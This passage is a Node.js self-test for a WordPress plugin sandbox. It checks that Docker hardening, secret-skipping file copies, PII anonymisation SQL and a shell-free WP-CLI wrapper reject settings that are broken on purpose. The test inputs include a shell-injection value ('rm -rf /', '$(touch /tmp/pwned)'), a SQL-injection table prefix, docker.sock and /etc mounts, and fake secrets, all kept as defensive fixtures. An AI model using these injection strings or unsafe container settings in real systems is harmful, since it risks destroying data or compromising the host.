#!/usr/bin/env node
// Self-test of issue mode, step 7, part 1: everything about the sandbox that needs NO Docker daemon.
//   container safeguards (each broken on purpose), image pinning, copy rules, generated config, anonymisation SQL, payment-gateway detection,
//   SandboxWpCli refusals, the db-export allow-list, and the bisection algorithm.
// Part 2 (selftest-issue-sandbox-lifecycle.js) drives the lifecycle against a fake docker; part 3 (…-docker.js) needs a real daemon.

const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'pg-sbx-'));
const policy = require('../issue/sandbox-policy');
const copy = require('../issue/sandbox-copy');
const cfg = require('../issue/sandbox-config');
const wpcli = require('../issue/sandbox-wpcli');
const bisect = require('../issue/bisect');
const { WpCli } = require('../lib/wpcli');

let failures = 0;
const ok = (c, m) => { console.log(`${c ? 'PASS' : 'FAIL'}  ${m}`); if (!c) failures++; };
const group = t => console.log(`\n== ${t}`);
const write = (root, rel, body, mode) => { const f = path.join(root, rel); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, body); if (mode) fs.chmodSync(f, mode); return f; };
function hashTree(dir) { const h = crypto.createHash('sha256'); (function walk(d) { for (const n of fs.readdirSync(d).sort()) { const f = path.join(d, n), st = fs.lstatSync(f); h.update(`${path.relative(dir, f)}|${st.isSymbolicLink() ? 'l:' + fs.readlinkSync(f) : st.isDirectory() ? 'd' : 'f'}|${st.mode}|`); if (st.isDirectory()) walk(f); else if (st.isFile()) h.update(fs.readFileSync(f)); } })(dir); return h.digest('hex'); }
const throws = fn => { try { fn(); return null; } catch (e) { return e; } };
const clone = o => JSON.parse(JSON.stringify(o));
const src = f => fs.readFileSync(path.join(__dirname, '..', f), 'utf8');

(async () => {
    // ================================================================ images
    group('images: official images pinned by digest');
    const pins = policy.images();
    ok(Object.keys(pins.images).sort().join() === 'cli,db,wordpress' && Object.values(pins.images).every(i => /^[a-z]+@sha256:[0-9a-f]{64}$/.test(i.ref) && i.ref.endsWith(i.digest) && i.digest.length === 71), 'wordpress, wordpress:cli and mariadb are each pinned as repo@sha256:<64 hex>');
    ok(pins.images.wordpress.repo === 'wordpress' && pins.images.cli.repo === 'wordpress' && pins.images.db.repo === 'mariadb' && pins.images.wordpress.tag === '7.1.3-php8.3-apache' && pins.resolved_at, 'they are the official Docker Hub repositories (no third-party image), with their tag and the date they were resolved');
    ok(throws(() => { const f = path.join(tmp, 'bad-pins.json'); write(tmp, 'bad-pins.json', JSON.stringify({ images: { wordpress: { ref: 'wordpress:latest' }, cli: pins.images.cli, db: pins.images.db } })); policy.images(f); }), 'a pin file that names an image by TAG is refused');

    // ================================================================ container safeguards
    group('containers: every safeguard is enforced, and breaking each one is caught');
    const mk = (extra = {}) => policy.buildSpec({ project: policy.newProject(), issueId: 'iss-20261028-100000-abcdef', siteDir: path.join(tmp, 'sb', 'site'), logDir: path.join(tmp, 'sb', 'logs'), themes: ['acme'], hasLanguages: true, ...extra });
    const SB = path.join(tmp, 'sb');
    const good = mk();
    ok(policy.validateSpec(good, { sandboxDir: SB }).length === 0, 'the generated specification passes every check');
    const bad = (mut, re, msg) => { const s = clone(good); mut(s); const v = policy.validateSpec(s, { sandboxDir: SB }); ok(v.some(x => re.test(x)), `${msg} -> refused (${(v.find(x => re.test(x)) || 'NOT CAUGHT').slice(0, 90)})`); };
    bad(s => { s.services.wordpress.privileged = true; }, /privileged/, 'privileged: true');
    bad(s => { s.services.cli.volumes.push('/var/run/docker.sock:/var/run/docker.sock'); }, /docker socket/i, 'docker.sock mounted');
    bad(s => { s.services.db.volumes.push('/run/docker.sock:/x'); }, /docker socket|outside the sandbox/i, 'docker.sock mounted from /run');
    bad(s => { s.services.wordpress.network_mode = 'host'; }, /network_mode/, 'host network');
    bad(s => { s.services.wordpress.pid = 'host'; }, /"pid" is not an allowed/, 'host PID namespace');
    bad(s => { s.services.wordpress.ipc = 'host'; }, /"ipc" is not an allowed/, 'host IPC namespace');
    bad(s => { s.services.wordpress.devices = ['/dev/sda:/dev/sda']; }, /"devices"/, 'a host device');
    bad(s => { s.services.wordpress.sysctls = { 'net.ipv4.ip_forward': 1 }; }, /"sysctls"/, 'sysctls');
    bad(s => { delete s.services.db.cap_drop; }, /cap_drop must include ALL/, 'cap_drop missing');
    bad(s => { s.services.db.cap_drop = ['NET_RAW']; }, /cap_drop must include ALL/, 'cap_drop that is not ALL');
    bad(s => { s.services.wordpress.cap_add.push('SYS_ADMIN'); }, /capability SYS_ADMIN/, 'cap_add SYS_ADMIN');
    bad(s => { s.services.wordpress.cap_add.push('NET_ADMIN'); }, /capability NET_ADMIN/, 'cap_add NET_ADMIN');
    bad(s => { s.services.wordpress.cap_add.push('SYS_PTRACE'); }, /capability SYS_PTRACE/, 'cap_add SYS_PTRACE');
    bad(s => { s.services.db.security_opt = []; }, /security_opt must be exactly/, 'no-new-privileges missing');
    bad(s => { s.services.db.security_opt = ['seccomp=unconfined', 'no-new-privileges:true']; }, /security_opt must be exactly/, 'seccomp=unconfined added next to no-new-privileges');
    bad(s => { s.services.wordpress.security_opt = ['no-new-privileges:true', 'apparmor=unconfined']; }, /security_opt must be exactly/, 'apparmor=unconfined added');
    bad(s => { s.services.cli.security_opt = ['no-new-privileges:true', 'label=disable']; }, /security_opt must be exactly/, 'SELinux label=disable added');
    bad(s => { s.services.cli.security_opt = ['no-new-privileges:false']; }, /security_opt must be exactly/, 'no-new-privileges:false');
    bad(s => { delete s.services.wordpress.mem_limit; }, /mem_limit must be set/, 'memory limit missing');
    bad(s => { s.services.wordpress.mem_limit = '64g'; }, /mem_limit must be set and at most/, 'memory limit far too high');
    bad(s => { delete s.services.wordpress.cpus; }, /cpus must be set/, 'CPU limit missing');
    bad(s => { s.services.wordpress.cpus = 64; }, /cpus must be set and at most/, 'CPU limit too high');
    bad(s => { delete s.services.cli.pids_limit; }, /pids_limit must be set/, 'process limit missing');
    bad(s => { s.services.cli.pids_limit = 100000; }, /pids_limit must be set and at most/, 'process limit too high');
    bad(s => { s.services.wordpress.ports = ['80:80']; }, /127\.0\.0\.1 only/, 'port published on all interfaces (80:80)');
    bad(s => { s.services.wordpress.ports = ['0.0.0.0:8080:80']; }, /127\.0\.0\.1 only/, 'port published on 0.0.0.0');
    bad(s => { s.services.wordpress.ports = [':80']; }, /127\.0\.0\.1 only/, 'port with no host address');
    bad(s => { s.services.db.ports = ['127.0.0.1::3306']; }, /only the wordpress service may publish/, 'the database publishing a port');
    bad(s => { s.services.wordpress.image = 'wordpress:7.1.3-php8.3-apache'; }, /not pinned by digest/, 'image by tag');
    bad(s => { s.services.db.image = 'mariadb@sha256:abc'; }, /not pinned by digest/, 'image with a short digest');
    bad(s => { s.name = 'wordpress'; }, /random prefix/, 'project name that is not pgsb + 8 hex');
    bad(s => { s.name = 'pgsb1234'; }, /random prefix/, 'project name with too few random digits');
    bad(s => { delete s.services.cli.labels['pg.sandbox']; }, /labels pg\.sandbox/, 'sandbox label missing');
    bad(s => { s.services.cli.labels['pg.project'] = 'pgsb00000000'; }, /labels pg\.sandbox/, 'label naming another project');
    bad(s => { s.services.wordpress.volumes.push('/etc:/host-etc'); }, /outside the sandbox folder/, 'bind mount of /etc');
    bad(s => { s.services.wordpress.volumes.push('/home:/h'); }, /outside the sandbox folder/, 'bind mount of /home');
    bad(s => { s.services.wordpress.volumes.push(path.join(tmp, 'elsewhere') + ':/x'); }, /outside the sandbox folder/, 'bind mount from another folder');
    bad(s => { s.services.wordpress.volumes.push('../up:/x'); }, /outside the sandbox folder/, 'relative bind mount');
    bad(s => { s.services.wordpress.volumes.push('undeclared:/x'); }, /not a declared named volume/, 'an undeclared volume');
    bad(s => { s.services.db.environment.MARIADB_PASSWORD = null; }, /must be a literal string/, 'an environment value taken from the host (null)');
    bad(s => { s.services.db.environment.X = '${HOST_SECRET}'; }, /no variable interpolation/, 'host variable interpolation');
    bad(s => { s.services.wordpress.privileged = false; s.services.wordpress.env_file = ['/etc/environment']; }, /"env_file"/, 'env_file');
    bad(s => { s.services.db.networks = ['front']; }, /only the wordpress service may use a network with a route out/, 'the database on the network that has a route out');
    bad(s => { s.services.cli.networks = ['front']; }, /only the wordpress service may use a network with a route out/, 'WP-CLI on the network that has a route out');
    bad(s => { s.networks.front.external = true; }, /external or host/, 'an external network');
    bad(s => { s.services.wordpress.dns = ['8.8.8.8']; }, /dns must point at an unroutable address/, 'a real DNS server for WordPress');
    bad(s => { s.services.db.restart = 'always'; }, /restart must be "no"/, 'restart: always');
    bad(s => { s.services.wordpress.extra_hosts = ['evil:1.2.3.4']; }, /"extra_hosts"/, 'extra_hosts');
    ok(good.networks.back.internal === true && good.services.db.networks.join() === 'back' && good.services.cli.networks.join() === 'back' && good.services.wordpress.networks.join() === 'back,front', 'only WordPress is on a network with a route out; the database and WP-CLI are on an internal network');
    ok(policy.ALLOWED_CAPS.join() === 'CHOWN,DAC_OVERRIDE,FOWNER,SETGID,SETUID' && good.services.cli.cap_add.length === 0, 'cap_drop ALL, with only five capabilities added back (the ones Apache and MariaDB need to start); WP-CLI gets none');
    const p1 = policy.newProject(), p2 = policy.newProject();
    ok(/^pgsb[0-9a-f]{8}$/.test(p1) && p1 !== p2, 'project names are random: pgsb + 8 hex digits');
    ok(Object.values(good.services).every(s => s.labels['pg.sandbox'] === '1' && s.labels['pg.owner'] === 'plugin-guard' && s.labels['pg.project'] === good.name && s.labels['pg.issue']) && Object.values(good.volumes).every(v => v.labels['pg.sandbox'] === '1') && Object.values(good.networks).every(n => n.labels['pg.sandbox'] === '1'), 'containers, volumes and networks all carry the labels teardown and the sweep look for');
    ok(JSON.stringify(good).indexOf('docker.sock') < 0 && Object.values(good.services).every(s => (s.volumes || []).every(v => !v.startsWith('/') || v.startsWith(path.join(tmp, 'sb')))), 'no docker.sock anywhere; every bind mount comes from inside the sandbox folder');
    const specFile = write(tmp, 'compose-check.json', JSON.stringify(good));
    const compose = spawnSync('docker', ['compose', '-f', specFile, 'config', '--format', 'json'], { encoding: 'utf8', timeout: 60000 });
    if (compose.status !== 0) console.log(`SKIP  docker compose config is not available here (${(compose.stderr || compose.error || '').toString().split('\n')[0]}): Compose\'s own parser was not consulted`);
    else {
        const c = JSON.parse(compose.stdout), S = c.services;
        ok(Object.values(S).every(s => s.cap_drop.includes('ALL') && s.security_opt.includes('no-new-privileges:true') && !s.privileged && !s.network_mode && s.mem_limit > 0 && s.cpus > 0 && s.pids_limit > 0 && s.restart === 'no'), 'Docker Compose\'s own parser, offline, reads back cap_drop ALL, no-new-privileges, no privileged, no network_mode, memory/CPU/pid limits, restart no');
        ok(S.wordpress.ports.length === 1 && S.wordpress.ports[0].host_ip === '127.0.0.1' && !S.db.ports && !S.cli.ports, 'Compose reads back the only published port as 127.0.0.1 -> 80 (WordPress), none on the database or WP-CLI');
        ok(c.networks.back.internal === true && !c.networks.front.internal && JSON.stringify(c).indexOf('docker.sock') < 0 && Object.values(S).every(s => /@sha256:[0-9a-f]{64}$/.test(s.image)), 'Compose reads back the internal network and the digest-pinned images');
    }

    // ================================================================ copy
    group('copying wp-content: symlinks never followed, secrets and backups skipped, size capped, original untouched');
    const orig = path.join(tmp, 'orig'), outside = path.join(tmp, 'outside');
    write(outside, 'secret.txt', 'root:x:0:0:SECRET-FROM-OUTSIDE');
    write(orig, 'wp-config.php', "<?php define('DB_PASSWORD','hunter2-original'); define('AUTH_KEY','ORIGINAL-SALT-VALUE');");
    write(orig, 'wp-content/plugins/good/good.php', '<?php // Plugin Name: Good\n');
    write(orig, 'wp-content/plugins/good/lib/util.js', 'x');
    write(orig, 'wp-content/plugins/good/.git/config', 'url = https://token@example.com/repo.git');
    write(orig, 'wp-content/plugins/good/.env', 'API_KEY=sk_live_FAKE_FIXTURE_VALUE');
    write(orig, 'wp-content/plugins/good/.env.production', 'X=1');
    write(orig, 'wp-content/plugins/good/wp-config.php', "<?php define('DB_PASSWORD','from-plugin');");
    write(orig, 'wp-content/plugins/good/id_rsa', 'PRIVATE KEY');
    write(orig, 'wp-content/plugins/good/deploy.pem', 'PEM');
    write(orig, 'wp-content/plugins/good/backup.sql', 'INSERT INTO users');
    write(orig, 'wp-content/plugins/good/site.zip', 'PK');
    write(orig, 'wp-content/plugins/good/old.bak', 'bak');
    write(orig, 'wp-content/plugins/good/debug.log', 'log');
    write(orig, 'wp-content/plugins/good/node_modules/x/index.js', 'x');
    write(orig, 'wp-content/plugins/good/ai1wm-backups/b.wpress', 'x');
    write(orig, 'wp-content/themes/acme/style.css', '/* Theme Name: Acme */');
    write(orig, 'wp-content/mu-plugins/mu.php', '<?php');
    write(orig, 'wp-content/uploads/2026/photo.jpg', 'JPG');
    write(orig, 'wp-content/advanced-cache.php', '<?php // cache');
    write(orig, 'wp-content/object-cache.php', '<?php // redis');
    write(orig, 'wp-content/db.php', '<?php // other database');
    write(orig, 'wp-content/debug.log', 'secret log');
    write(orig, 'wp-content/cache/page.html', 'cached');
    fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(orig, 'wp-content/plugins/good/link-to-secret.txt'));
    fs.symlinkSync(outside, path.join(orig, 'wp-content/plugins/good/link-to-dir'));
    fs.symlinkSync(path.join(orig, 'wp-config.php'), path.join(orig, 'wp-content/themes/acme/config-link.php'));
    fs.symlinkSync(outside, path.join(orig, 'wp-content/plugins/evil-plugin'));
    const origHash = hashTree(orig);
    const SBX = path.join(tmp, 'sandboxes', 'iss-20261028-100000-abcdef');
    fs.mkdirSync(SBX, { recursive: true, mode: 0o700 });
    const rep = copy.copySite(orig, path.join(SBX, 'site'), { sandboxDir: SBX });
    const copied = f => fs.existsSync(path.join(SBX, 'site', f));
    ok(copied('wp-content/plugins/good/good.php') && copied('wp-content/plugins/good/lib/util.js') && copied('wp-content/themes/acme/style.css') && copied('wp-content/mu-plugins/mu.php'), 'plugins, themes and mu-plugins are copied');
    ok(!copied('wp-content/plugins/good/link-to-secret.txt') && !copied('wp-content/plugins/good/link-to-dir') && !copied('wp-content/themes/acme/config-link.php') && !copied('wp-content/plugins/evil-plugin'), 'symbolic links (to a file outside, to a folder outside, to wp-config.php, and a plugin that is itself a link) are NOT copied');
    const allText = (() => { let t = ''; (function w(d) { for (const e of fs.readdirSync(d, { withFileTypes: true })) { const f = path.join(d, e.name); if (e.isDirectory()) w(f); else if (e.isFile()) t += fs.readFileSync(f, 'utf8'); } })(path.join(SBX, 'site')); return t; })();
    ok(!allText.includes('SECRET-FROM-OUTSIDE') && !allText.includes('hunter2-original') && !allText.includes('ORIGINAL-SALT-VALUE') && !allText.includes('FAKE_FIXTURE_VALUE'), 'nothing from outside, no password, no salt and no API key of the original appears anywhere in the copy');
    ok(['.git/config', '.env', '.env.production', 'wp-config.php', 'id_rsa', 'deploy.pem', 'backup.sql', 'site.zip', 'old.bak', 'debug.log', 'node_modules/x/index.js', 'ai1wm-backups/b.wpress'].every(f => !copied(`wp-content/plugins/good/${f}`)), '.git, .env*, wp-config.php, keys, certificates, SQL dumps, archives, .bak, logs, node_modules and backup folders are skipped');
    ok(!copied('wp-content/uploads/2026/photo.jpg') && !copied('wp-content/debug.log') && !copied('wp-content/cache/page.html') && rep.uploads_copied === false, 'uploads are NOT copied by default (nor wp-content/debug.log or cache)');
    ok(copied('wp-content/advanced-cache.php') && !copied('wp-content/object-cache.php') && !copied('wp-content/db.php') && rep.dropins_copied.join() === 'advanced-cache.php', 'the advanced-cache.php drop-in is kept; object-cache.php and db.php (services the sandbox does not have) are skipped');
    ok(rep.symlinks_skipped === 4 && Object.keys(rep.skipped_by_reason).some(r => /symbolic link/.test(r)) && rep.skipped_total >= 16, `the report counts what was skipped and why (${rep.symlinks_skipped} links; ${rep.skipped_total} items)`);
    ok(fs.readFileSync(path.join(SBX, 'site/wp-content/plugins/good/good.php'), 'utf8') === '<?php // Plugin Name: Good\n' && (fs.statSync(path.join(SBX, 'site/wp-content/plugins/good/good.php')).mode & 0o777) === 0o644, 'copied files have the same content and normalised permissions (0644)');
    ok(hashTree(orig) === origHash, 'the ORIGINAL tree (content, modes, link targets) is byte-identical after the copy');
    const SBX2 = path.join(tmp, 'sandboxes', 'iss-20261028-100000-bbbbbb'); fs.mkdirSync(SBX2, { recursive: true });
    const withU = copy.copySite(orig, path.join(SBX2, 'site'), { sandboxDir: SBX2, withUploads: true });
    ok(fs.existsSync(path.join(SBX2, 'site/wp-content/uploads/2026/photo.jpg')) && withU.uploads_copied, 'uploads are copied only when asked (--with-uploads)');
    const SBX3 = path.join(tmp, 'sandboxes', 'iss-20261028-100000-cccccc'); fs.mkdirSync(SBX3, { recursive: true });
    write(orig, 'wp-content/plugins/big/big.bin', Buffer.alloc(3 * 1024 * 1024).toString('latin1'));
    const cap = throws(() => copy.copySite(orig, path.join(SBX3, 'site'), { sandboxDir: SBX3, maxBytes: 1024 * 1024 }));
    ok(cap && /above the 1 MB cap/.test(cap.message) && /Nothing was copied/.test(cap.message) && !fs.existsSync(path.join(SBX3, 'site')), 'above the size cap the copy is REFUSED before anything is written (no silent partial copy), naming the largest parts');
    const fileCap = copy.scan(orig, { maxFileBytes: 1024 * 1024 });
    ok(fileCap.skipped.some(s => /big\.bin/.test(s.path) && /larger than/.test(s.reason)), 'a single file above the per-file cap is skipped and reported');
    const escape = throws(() => copy.copySite(orig, path.join(tmp, 'not-in-sandbox', 'site'), { sandboxDir: SBX3 }));
    ok(escape && /not inside the sandbox folder/.test(escape.message), 'a destination outside the sandbox folder is refused');
    const overlap = throws(() => copy.copySite(orig, path.join(orig, 'wp-content', 'sbx', 'site'), { sandboxDir: path.join(orig, 'wp-content', 'sbx') }));
    ok(overlap && /overlap/.test(overlap.message), 'a sandbox folder inside the original site is refused (it would be downloadable and copied into itself)');
    ok(hashTree(path.join(orig, 'wp-content/plugins/good')) === hashTree(path.join(orig, 'wp-content/plugins/good')), 'original unchanged');

    // ================================================================ generated config
    group('generated wp-config.php and the must-use guard plugin');
    const c1 = { name: 'wordpress', user: 'wp', pass: policy.rand(), root: policy.rand() }, c2 = { name: 'wordpress', user: 'wp', pass: policy.rand(), root: policy.rand() };
    const w1 = cfg.wpConfig({ creds: c1, prefix: 'wp_' }), w2 = cfg.wpConfig({ creds: c2, prefix: 'wp_' });
    const saltOf = (w, k) => new RegExp(`'${k}', '([^']+)'`).exec(w)[1];
    ok(cfg.SALT_KEYS.every(k => saltOf(w1, k).length === 64 && saltOf(w1, k) !== saltOf(w2, k)), 'all eight keys/salts are fresh, 64 characters, and differ between two sandboxes');
    ok(!w1.includes('ORIGINAL-SALT-VALUE') && !w1.includes('hunter2-original') && c1.pass !== c2.pass && /^[A-Za-z0-9]{24}$/.test(c1.pass), 'nothing comes from the original wp-config.php; database credentials are random per sandbox');
    ok(/define\( 'WP_HTTP_BLOCK_EXTERNAL', true \)/.test(w1) && !/WP_ACCESSIBLE_HOSTS/.test(w1.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '')), 'WP_HTTP_BLOCK_EXTERNAL is true and WP_ACCESSIBLE_HOSTS is not set (no host is allowed)');
    ok(/DISABLE_WP_CRON', true/.test(w1) && /DISALLOW_FILE_MODS', true/.test(w1) && /AUTOMATIC_UPDATER_DISABLED', true/.test(w1) && /WP_DEBUG_DISPLAY', false/.test(w1) && /WP_DEBUG_LOG', '\/var\/log\/pg\/debug\.log'/.test(w1), 'cron, updates and file modifications are off; errors go to a log file, never to the page');
    ok(/url\.txt/.test(w1) && !/127\.0\.0\.1:\d{4,5}/.test(w1), 'the sandbox address comes from a file written once the port is known, so wp-config.php never has to be edited');
    const quoted = cfg.wpConfig({ creds: { name: 'w', user: 'u', pass: "a'b\\c" }, prefix: 'wp_' });
    ok(/define\( 'DB_PASSWORD', 'a\\'b\\\\c' \)/.test(quoted), 'quotes and backslashes in a credential are escaped');
    ok(throws(() => cfg.wpConfig({ creds: c1, prefix: "wp_'; DROP" })), 'an unsafe table prefix is refused');
    const php = (name, body) => { const f = write(tmp, `php/${name}.php`, body); return spawnSync('php', ['-l', f], { encoding: 'utf8' }); };
    if (spawnSync('php', ['-v']).status !== 0) console.log('SKIP  php is not installed: the generated PHP was not syntax-checked or run');
    else {
        ok(php('wpconfig', w1).status === 0 && php('mu', cfg.MU_PLUGIN).status === 0 && php('wpconfig2', quoted).status === 0, 'the generated wp-config.php and the must-use plugin are valid PHP (php -l)');
        const harness = write(tmp, 'php/run-mu.php', `<?php
define('ABSPATH', '/x/'); $f = array();
function add_filter($tag, $cb, $prio = 10, $args = 1) { global $f; $f[$tag][] = $cb; }
class WP_Error { public $code; function __construct($c) { $this->code = $c; } }
function wp_json_encode($v) { return json_encode($v); }
include ${JSON.stringify(path.join(tmp, 'php/mu.php'))};
$mail = $f['pre_wp_mail'][0](null, array('to' => 'customer@shop.example', 'subject' => 'Your order'));
$http = $f['pre_http_request'][0](false, array('method' => 'POST'), 'https://api.stripe.com/v1/charges?key=sk_live_x');
echo json_encode(array('mail' => $mail, 'http_is_error' => $http instanceof WP_Error, 'http_code' => $http->code, 'blog_public' => isset($f['pre_option_blog_public'])));`);
        const r = spawnSync('php', [harness], { encoding: 'utf8' });
        let j = {}; try { j = JSON.parse(r.stdout); } catch { /* shown below */ }
        ok(j.mail === true && j.http_is_error === true && j.http_code === 'pg_sandbox_blocked' && j.blog_public === true, `run in PHP: wp_mail is short-circuited (reports success, sends nothing) and every WordPress HTTP request returns a WP_Error; the site is hidden from search (${(r.stdout || r.stderr).slice(0, 100)})`);
    }
    ok(policy.LIMITS.length === 5 && /do NOT stop code that opens its own connection: raw cURL, fsockopen/.test(policy.LIMITS[0]) && /raw IP address is NOT blocked/.test(policy.LIMITS[1]) && /internal network with no route out/.test(policy.LIMITS[2]) && /SMTP|mail\(\)/.test(policy.LIMITS[3]), 'the limits of the outbound blocking are stated plainly: what WP_HTTP_BLOCK_EXTERNAL does not stop, and that raw IP connections are not blocked');

    // ================================================================ anonymisation + payments
    group('anonymisation SQL (default on) and payment gateways');
    const T = ['users', 'usermeta', 'options', 'posts', 'postmeta', 'comments', 'commentmeta', 'wc_orders', 'wc_order_addresses', 'wc_customer_lookup', 'woocommerce_sessions', 'woocommerce_api_keys', 'myplugin_leads', 'crm_contacts'];
    const an = cfg.anonymiseSql('wp_', T);
    const sql = an.statements.join('\n');
    ok(/UPDATE `wp_users` SET user_login = CONCAT\('user', ID\)/.test(sql) && /user_email = CONCAT\('user', ID, '@example\.invalid'\)/.test(sql) && /user_pass = '!'/.test(sql), 'users: login, e-mail (an RFC 2606 .invalid address) and password hash are replaced; "!" is not a valid hash, so nobody can log in as anyone');
    ok(/session_tokens/.test(sql) && /first_name', 'last_name', 'nickname'/.test(sql) && /billing\\_%/.test(sql), 'usermeta: session tokens deleted; names and billing/shipping details scrubbed');
    ok(/wp_comments` SET comment_author = 'Anonymous'.*comment_author_IP = '0\.0\.0\.0'/.test(sql), 'comments: author, e-mail, URL and IP scrubbed');
    ok(/admin_email', 'new_admin_email'/.test(sql) && /_transient/.test(sql), 'admin e-mail replaced; transients (which can hold personal data) deleted');
    ok(/wp_wc_orders` SET billing_email/.test(sql) && /wc_order_addresses` SET first_name = ''/.test(sql) && /wc_customer_lookup/.test(sql) && /DELETE FROM `wp_woocommerce_sessions`/.test(sql) && /DELETE FROM `wp_woocommerce_api_keys`/.test(sql) && /shop_order/.test(sql), 'WooCommerce: order e-mail/IP, order addresses, customer lookup, sessions and API keys');
    ok(/option_name LIKE '%api\\_key%'/.test(sql) && /option_name LIKE '%secret%'/.test(sql) && /option_name LIKE '%\\_settings'/.test(sql) && /sk\\_live/.test(sql), 'secrets: options that look like API keys, secrets, tokens or passwords are blanked, and so is any plugin settings blob that contains one (this also leaves a payment gateway unconfigured)');
    ok(an.unscrubbed.join() === 'crm_contacts,myplugin_leads' && an.covered.includes('users') && !an.covered.includes('myplugin_leads'), `tables of other plugins are NOT scrubbed, and the report says which: ${an.unscrubbed.join(', ')}`);
    ok(cfg.anonymiseSql('wp_', ['options']).statements.every(s => !/wp_users|usermeta/.test(s)) && cfg.anonymiseSql('wp_', []).statements.length === 0, 'statements are only generated for tables that exist');
    const keep = cfg.anonymiseSql('wp_', T, { personal: false });
    ok(keep.statements.length === 2 && keep.statements.every(s => /option_value = ''/.test(s)) && !keep.statements.some(s => /user_email|comments/.test(s)), 'with real data kept (personal: false) ONLY the two secret-blanking statements remain: keys and gateway settings are still blanked');
    ok(throws(() => cfg.anonymiseSql("wp_`; DROP TABLE x; --", T)), 'a table prefix that could inject SQL is refused');
    ok(!/\$\{|undefined/.test(sql), 'the SQL contains no unresolved placeholder');
    const ser = (o) => `a:${Object.keys(o).length}:{${Object.entries(o).map(([k, v]) => `s:${k.length}:"${k}";s:${String(v).length}:"${v}";`).join('')}}`;
    const rows = [
        { option_name: 'woocommerce_stripe_settings', option_value: ser({ enabled: 'yes', testmode: 'no', secret_key: 'sk_live_abcd' }) },
        { option_name: 'woocommerce_ppcp-gateway_settings', option_value: ser({ enabled: 'yes', sandbox_on: 'no' }) },
        { option_name: 'woocommerce_square_settings', option_value: ser({ enabled: 'yes', testmode: 'yes' }) },
        { option_name: 'woocommerce_bacs_settings', option_value: ser({ enabled: 'yes' }) },
        { option_name: 'woocommerce_cheque_settings', option_value: ser({ enabled: 'yes' }) },
        { option_name: 'woocommerce_klarna_settings', option_value: ser({ enabled: 'no', testmode: 'no' }) },
        { option_name: 'woocommerce_email_new_order_settings', option_value: ser({ recipient: 'x@y.z' }) }
    ];
    const modes = cfg.gatewayModes(rows), by = Object.fromEntries(modes.map(m => [m.gateway, m]));
    ok(by.stripe.mode === 'live' && by.stripe.enabled && by['ppcp-gateway'].mode === 'unknown' && by.square.mode === 'test' && by.klarna.mode === 'live' && !by.klarna.enabled && !by.bacs && !by.cheque && !by.email_new_order, 'gateway detection: live key / testmode "no" = live; no setting = unknown; testmode "yes" = test; offline gateways (bacs, cheque) and e-mail settings are not gateways');
    const block = cfg.blockingGateways(modes);
    ok(block.map(g => g.gateway).sort().join() === 'ppcp-gateway,stripe', 'blocking: enabled and live, or enabled and unknown. A disabled live gateway and an enabled test gateway do not block');
    ok(/REPLACE\(option_value, 's:7:"enabled";s:3:"yes";', 's:7:"enabled";s:2:"no";'\)/.test(cfg.neutraliseSql('wp_')) && /NOT IN \('woocommerce_bacs_settings'/.test(cfg.neutraliseSql('wp_')), 'neutralising switches "enabled" to "no" with the right serialized length, and leaves offline gateways alone');

    // ================================================================ SandboxWpCli
    group('SandboxWpCli: path re-checked on every call, original refused, closed command table, clean environment, no shell');
    const SBR = path.join(tmp, 'sandboxes');
    const calls = [];
    const runner = (bin, argv, opts) => { calls.push({ bin, argv, opts }); return { status: 0, stdout: 'ok', stderr: '' }; };
    const mkSandbox = (name, project = 'pgsb1a2b3c4d') => { const d = path.join(SBR, name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'compose.json'), '{}'); fs.writeFileSync(path.join(d, 'state.json'), JSON.stringify({ project })); return d; };
    const goodDir = mkSandbox('iss-20261028-100000-aaaaaa');
    const mkCli = (o = {}) => new wpcli.SandboxWpCli({ sandboxesRoot: SBR, sandboxDir: goodDir, project: 'pgsb1a2b3c4d', originals: [orig], dockerBin: '/usr/bin/docker', runner, env: { PATH: '/usr/bin', HOME: '/home/x' }, ...o });
    const w = mkCli();
    const r1 = w.run(['plugin', 'deactivate', 'a', 'b']);
    ok(r1.ok && calls[0].argv.join(' ') === `compose -p pgsb1a2b3c4d -f ${goodDir}/compose.json exec -T cli wp plugin deactivate a b --path=/var/www/html`, `runs  docker compose -p <project> -f <this sandbox's compose.json> exec -T cli wp <args> --path=/var/www/html  (${calls[0].argv.slice(0, 4).join(' ')} ...)`);
    ok(Array.isArray(calls[0].argv) && calls[0].opts.shell === false && calls[0].bin === '/usr/bin/docker', 'an argument ARRAY and shell: false, with an absolute path to docker: no shell is ever involved');
    const meta = w.run(['option', 'update', 'blogname', '$(touch /tmp/pwned); `id` && rm -rf / | cat']);
    ok(meta.ok && calls[1].argv.includes('$(touch /tmp/pwned); `id` && rm -rf / | cat') && !fs.existsSync('/tmp/pwned') && calls[1].opts.shell === false, 'shell metacharacters in a value are passed as ONE literal argument; nothing is interpreted');
    ok(w.sql('SELECT 1').ok && calls[2].argv.slice(-4).join(' ') === 'wp db query --path=/var/www/html'.split(' ').slice(-4).join(' ') && calls[2].opts.input === 'SELECT 1', 'SQL generated by Plugin Guard goes in on stdin, not on the command line');

    const refused = (fn, re, msg) => { const e = throws(fn); ok(e && e.name === 'SandboxRefusal' && re.test(e.message) && e.exitCode === 3, `${msg} -> refused (${e ? e.message.slice(0, 85) : 'NOT REFUSED'})`); };
    // -- paths --
    refused(() => mkCli({ sandboxDir: orig }), /not a sandbox folder|does not exist|compose\.json/, 'the sandbox folder IS the original site');
    refused(() => mkCli({ sandboxDir: path.join(orig, 'wp-content') }), /not a sandbox folder|original site or inside/, 'the sandbox folder is inside the original');
    refused(() => mkCli({ originals: [SBR] }), /original site|inside the sandbox folder|sandboxes folder is inside/, 'the original site CONTAINS the sandbox folder');
    refused(() => mkCli({ originals: [goodDir] }), /original site or inside it/, 'the original IS this folder');
    const linkToOrig = path.join(SBR, 'iss-20261028-100000-link001'); fs.symlinkSync(orig, linkToOrig);
    refused(() => mkCli({ sandboxDir: linkToOrig }), /symbolic link|original|compose\.json|not a sandbox folder/, 'a sandbox folder that is a symlink to the original');
    const linkElsewhere = path.join(SBR, 'iss-20261028-100000-link002'); fs.symlinkSync(outside, linkElsewhere);
    refused(() => mkCli({ sandboxDir: linkElsewhere }), /symbolic link|not a sandbox folder|compose\.json/, 'a sandbox folder that is a symlink to somewhere else');
